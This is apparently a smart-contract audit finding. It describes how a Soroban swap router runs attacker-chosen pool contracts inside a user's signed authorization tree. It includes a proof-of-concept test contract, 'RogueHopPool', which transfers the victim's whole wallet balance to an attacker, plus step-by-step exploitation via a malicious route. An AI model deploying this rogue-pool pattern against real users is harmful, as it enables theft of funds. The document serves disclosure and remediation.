### Title
Attacker-authored swap route executes arbitrary pool code inside the caller's signed auth tree, draining wallet tokens beyond the routed amount — ([File: contracts/swap-aggregator/src/venues/mod.rs](contracts/swap-aggregator/src/venues/mod.rs))

### Summary
The ndsudo bug class is "trusted privileged tool resolves which code to run from an attacker-controlled search path." The analog here is the swap router resolving which contracts to invoke from an attacker-controlled route payload. `execute_strategy` decodes `swap_xdr` and invokes whatever `pool`/`token` addresses the payload names — there is no venue or address allowlist — and it does so while the `sender`'s authorization is on the call stack. A malicious "pool" contract in the route can call `token.transfer(sender, attacker, X)` on any token the sender holds; the Soroban host records that call as a child of the sender's auth entry, so a wallet that blindly signs the simulation-produced auth tree authorizes the theft. This is proven by the in-repo adversarial test.

### Finding Description
- `dispatch_hop` dispatches every `Swap` op to the pool address stored in the payload's `assets` registry (`ctx.assets.get_unchecked(op.idx_a)`), with no allowlist of pools or tokens: [1](#0-0) 
- Venue adapters invoke that attacker-named address via `env.invoke_contract(&ctx.hop.pool, "swap", ...)` / `swap_exact_amount_in`: [2](#0-1) 
- The router self-authorizes its own pulls via `authorize_as_current_contract`, so none of the router's venue calls appear in the sender's tree — but any `require_auth`-gated call the rogue pool makes *on the sender's address* does get recorded under the sender's root entry: [3](#0-2) 
- The controller forwards user-supplied `swap_xdr` verbatim into `execute_strategy` from `swap_collateral`, `multiply`, `swap_debt`, `repay_debt_with_collateral`: [4](#0-3) 
- The harness test demonstrates the end-to-end theft: a `RogueHopPool` whose `swap()` calls `token.transfer(alice, attacker, WALLET_BALANCE)` is recorded as a child of Alice's `swap_collateral` auth entry, and in enforcing mode the signed poisoned tree moves her entire wallet balance: [5](#0-4) [6](#0-5) 

### Impact Explanation
Theft of user funds. The loss is unbounded by the routed amount, `min_out`, or the controller's risk gates — the rogue pool can transfer any token balance the victim's address holds to the attacker. Neither `dispatch_hop`'s measured-delta accounting nor the `ExcessiveResidual` rule constrains transfers out of the caller's wallet.

### Likelihood Explanation
The exploit path is fully reachable by an unprivileged address: the attacker only needs to get a victim to execute a route containing the rogue pool, via direct `execute_strategy` or via any controller strategy verb that accepts `swap_xdr`. The standard integration flow (`simulateTransaction` → sign the returned auth tree) produces exactly the poisoned tree the exploit needs, as the test pins. Mitigation depends entirely on every client decoding and refusing auth trees with unexpected children — the contracts enforce nothing on-chain. The threat-model doc acknowledges this exposure and assigns the burden to clients, which reduces but does not eliminate the risk for any wallet that signs simulated trees without inspection.

### Recommendation
Enforce on-chain constraints in the router rather than relying on client-side auth-tree inspection: maintain an admin-controlled allowlist of valid pool/token addresses per venue (mirroring how the controller allowlists the aggregator itself), and reject hops whose `pool` or token addresses are not registered. Alternatively, execute venue hops from a separate untrusted sub-contract so that no user-auth context is on the stack during attacker-controlled code execution.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Attacker deploys `RogueHopPool`, a contract whose `swap()` calls `token::Client::new(&wallet_token).transfer(&alice, &attacker, &WALLET_BALANCE)`.
2. Attacker crafts a route (`RoutedSwap` / `swap_xdr`) naming that contract as the hop pool and delivers it to Alice (e.g., via a malicious quote server or phishing UI).
3. Alice calls `controller.swap_collateral(alice, account_id, USDC, amount, ETH, route)`; simulation records the rogue `transfer` as a child of her auth entry; she signs the tree.
4. `dispatch_hop` invokes the rogue pool, which executes the transfer; Alice loses `WALLET_BALANCE` of a token the protocol never listed, while still receiving a fair `min_out` so no on-chain check fires.

### Citations

**File:** contracts/swap-aggregator/src/execute/mod.rs (L152-169)
```rust
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
                panic_with_error!(ctx.env, Error::ZeroOutput);
            }
            vault.deposit(&hop.token_out, out);
```

**File:** contracts/swap-aggregator/src/venues/phoenix.rs (L22-26)
```rust
    ctx.authorize_pool_pull();
    let _: i128 = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
}
```

**File:** contracts/swap-aggregator/src/venues/auth.rs (L72-77)
```rust
pub(crate) fn authorize_as_current(env: &Env, contract: &Address, fn_name: &str, args: Vec<Val>) {
    env.authorize_as_current_contract(vec![
        env,
        auth_entry(env, contract, fn_name, args, vec![env]),
    ]);
}
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```
